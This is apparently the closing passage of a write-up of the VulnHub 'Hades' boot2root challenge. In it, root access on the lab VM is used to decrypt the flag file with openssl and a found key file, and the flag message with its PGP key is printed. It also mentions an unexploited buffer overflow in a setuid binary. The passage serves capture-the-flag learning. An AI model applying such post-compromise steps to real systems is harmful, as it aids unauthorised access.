0000000: 97 03 80 db fa cc f4 45 75 27 d5 11 4f a9 a1 ba  .......Eu'..O...
0000010: d5 e6 a0 6c 2d ef 8d c6 7d cc b8 fd 6d b6 5a a2  ...l-...}...m.Z.
0000020: c8 76 62 2f 68 29 a4 a0 a9 1b b9 2b d3 ca 53 b6  .vb/h).....+..S.
0000030: f7 3a df 57 8d 58 71 27 6f 63 59 18 81 6f 02 29  .:.W.Xq'ocY..o.)
0000040: 3a f9 25 ac 6f 9e 43 65 b9 9c 52 d0 50 3f e8 c0  :.%.o.Ce..R.P?..
0000050: c0 9a df 28 a1 50 c9 cb 87 f0 c3 db ca 77 1e 02  ...(.P.......w..
0000060: 1f e6 74 17 98 82 15 71 56 11 af 10 4f 14 c2 7a  ..t....qV...O..z
0000070: 84 e6 bd d4 8c 8f e0 41 5b e0 fa 72 ea a6 fb c9  .......A[..r....
0000080: 03 65 81 6e 07 87 67 56 69 91 84 a0 1d 96 91 53  .e.n..gVi......S
0000090: ba 04 19 52 44 e5 e2 1e 53 7f e8 31 95 3e 6a a1  ...RD...S..1.>j.
```

I wondered if this file might have been used to encrypt the flag. OpenSSL can take the password from either a string, a file descriptor, an environment varible, or a file, so it was worth a shot. 

```
# openssl enc -d -aes-256-cbc -pass file:/key_file -in flag.txt.enc -out flag.txt
# ls -l flag.txt
-rw-rw-r-- 1 root root 3352 Apr 15 03:42 flag.txt
```

No error message! It looked like the decryption worked. I opened flag.txt and was congratulated for finishing the challenge. 

```
# cat flag.txt
Congratulations on completing Hades.

Feel free to ping me on #vulnhub and tell me what you thought.

The PGP key below can be used to encrypt solution submissions, and to prove you got through it all.

-Lok_Sigma

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG/MacGPG2 v2.0.22 (Darwin)
Comment: GPGTools - http://gpgtools.org

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
=tmFl
-----END PGP PUBLIC KEY BLOCK-----
```

### Final thoughts

I suspect there's more than one way to get root on the server. Further analysis of the display_key binary showed that it was vulnerable to a buffer overflow that allowed me to overwrite EIP. The display_key was compiled with NX, so it looks like a little creativity will be required to exploit it. That should give me something to work on until the next challenge.

Overall this was a thoroughly enjoyable boot2root. I look forward to the next challenge. Many thanks to Lok_Sigma and VulnHub, and shout outs to [barrebas](https://twitter.com/barrebas) and [TheColonial](https://twitter.com/TheColonial) who were always one step ahead of me in the competition.
